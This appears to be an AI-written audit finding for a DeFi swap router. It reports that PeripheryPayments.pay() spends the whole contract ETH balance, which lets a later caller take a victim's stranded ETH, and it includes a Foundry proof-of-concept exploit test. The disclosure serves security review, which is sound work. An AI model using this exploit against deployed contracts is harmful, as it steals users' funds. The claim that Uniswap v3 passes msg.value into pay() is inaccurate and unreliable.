The vulnerability claim is valid. Here is the full analysis:

---

### Title
Cross-Caller ETH Theft via Unattributed `address(this).balance` in `PeripheryPayments.pay` — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`PeripheryPayments.pay()` uses the router's entire `address(this).balance` to fund WETH payments, with no per-caller attribution. Any ETH left in the router from a prior transaction (excess ETH or a partial fill) is silently consumed by the next caller's WETH swap, stealing the victim's funds.

---

### Finding Description

`pay()` contains this branch for WETH payments:

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
``` [1](#0-0) 

`nativeBalance` is the **entire** router balance — it is not scoped to `msg.value` of the current call. There is no per-caller ETH accounting.

ETH can be left in the router between transactions via two realistic paths:

**Path A — Excess ETH:** A user calls `exactInputSingle{value: X}(amountIn: A)` where `X > A`. The callback pays exactly `A` (the pool's positive delta). `X - A` ETH remains in the router.

**Path B — Partial fill:** A user calls `exactInputSingle{value: A}(amountIn: A, priceLimitX64: limit)`. If the price limit stops the swap early, the pool consumes only `Y < A`. The callback pays `Y`. `A - Y` ETH remains in the router. Note that `exactInputSingle` has **no** check that the full `amountIn` was consumed (unlike `exactInput` which has `if (amountInActual < amount) revert`). [2](#0-1) [3](#0-2) 

Once ETH is stranded in the router, any subsequent caller who specifies `tokenIn = WETH` will have `pay()` consume that ETH instead of pulling from their own WETH allowance. The attacker pays nothing; the victim's ETH is gone.

The `receive()` guard (`if (msg.sender != WETH) revert NotWETH()`) only blocks direct ETH transfers with no calldata. It does **not** block ETH sent as `msg.value` to a `payable` function like `exactInputSingle`, `exactOutputSingle`, or `multicall`. [4](#0-3) 

---

### Impact Explanation

Direct loss of user ETH. The victim's stranded ETH is consumed by the attacker's swap callback. The attacker receives swap output without spending their own WETH or ETH. The victim cannot recover the ETH via `refundETH()` because it has already been deposited as WETH and transferred to the pool on the attacker's behalf.

---

### Likelihood Explanation

- **Path A** requires a user to send excess ETH without a trailing `refundETH()` call. This is a realistic mistake, especially for integrators or users calling `exactInputSingle` directly rather than via `multicall`.
- **Path B** requires a partial fill, which occurs naturally whenever a `priceLimitX64` stops the swap before the full `amountIn` is consumed. No attacker setup is needed; the victim's own valid transaction creates the residue.

An attacker can monitor the mempool or router ETH balance and front-run or immediately follow any transaction that leaves ETH in the router.

---

### Recommendation

Replace the global `address(this).balance` read with `msg.value` scoped to the current call. The correct pattern (used by Uniswap v3's `PeripheryPayments`) is to pass `msg.value` explicitly into `pay()` and consume only that amount, not the entire contract balance. Alternatively, track per-call ETH credit in a local variable at the top of each swap entry point and pass it down to `pay()`.

---

### Proof of Concept

```solidity
// Foundry test sketch
function test_attackerStealsVictimEth() public {
    uint128 amountIn = 1 ether;

    // Victim sends 2 ether for a 1 ether WETH swap (excess ETH scenario)
    vm.deal(victim, 2 ether);
    vm.prank(victim);
    router.exactInputSingle{value: 2 ether}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: amountIn,          // only 1 ether consumed
            amountOutMinimum: 0,
            recipient: victim,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );
    // 1 ether now stranded in router

    assertEq(address(router).balance, 1 ether, "victim ETH stranded");

    // Attacker sends value:0, but pay() uses victim's 1 ether
    vm.prank(attacker);
    // attacker has WETH allowance = 0, but pay() never reaches safeTransferFrom
    router.exactInputSingle{value: 0}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: amountIn,          // paid by victim's stranded ETH
            amountOutMinimum: 0,
            recipient: attacker,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );

    assertEq(address(router).balance, 0, "victim ETH consumed by attacker");
    assertGt(token1.balanceOf(attacker), 0, "attacker received swap output for free");
}
```

The `pay()` call inside the attacker's swap callback sees `nativeBalance = 1 ether >= value = 1 ether`, deposits the victim's ETH as WETH, and transfers it to the pool — all without touching the attacker's WETH allowance. [5](#0-4)
